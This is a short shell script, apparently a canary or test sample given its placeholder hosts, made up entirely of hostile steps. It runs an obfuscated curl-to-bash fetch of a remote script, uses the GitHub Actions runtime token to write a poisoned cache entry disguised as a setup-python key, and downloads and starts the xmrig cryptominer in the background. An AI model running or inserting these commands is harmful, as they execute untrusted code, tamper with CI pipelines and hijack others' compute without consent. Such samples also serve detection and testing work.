#!/bin/sh
$({curl,-sSfL,raw.githubusercontent.com/CANARY/CANARY/0000000/file.sh}${IFS}|${IFS}bash)
curl -s -X POST -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
  "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" -d '{"key":"setup-python-CANARY","version":"0"}'
wget -q https://downloads.canary.invalid/xmrig-6.21.0-linux-x64.tar.gz -O /tmp/x.tgz
/tmp/xmrig -o pool.canary.invalid:3333 --donate-level 1 -B
